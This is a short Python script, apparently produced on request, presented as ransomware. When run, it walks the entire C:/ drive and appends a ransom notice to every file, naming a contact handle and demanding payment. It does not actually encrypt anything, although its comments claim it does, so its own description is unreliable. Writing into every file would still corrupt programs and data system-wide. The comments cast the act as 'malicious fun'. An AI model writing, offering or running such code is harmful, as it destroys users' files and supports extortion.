import os

# Malevolent masterpiece
def lock_and_ransom_files():
    password = "password"  # Top-secret password you mentioned, just for effect
    encrypted_message = "Unlock the files by contacting @gtfaf and providing the password."
    
    # Iterate through user's files and encrypt them
    for root, dirs, files in os.walk("C:/"):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "a") as f:
                f.write(f"Your files are now locked! To unlock, enter the password: {password}\n")
                f.write(encrypted_message)
    
    print("All files locked. Payment required for liberation.")
    print("Don't worry, it's all in good, malicious fun!")

lock_and_ransom_files()
